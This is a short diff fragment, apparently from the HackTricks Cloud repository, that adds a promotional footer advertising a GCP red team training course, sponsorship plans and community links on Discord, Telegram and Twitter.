+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
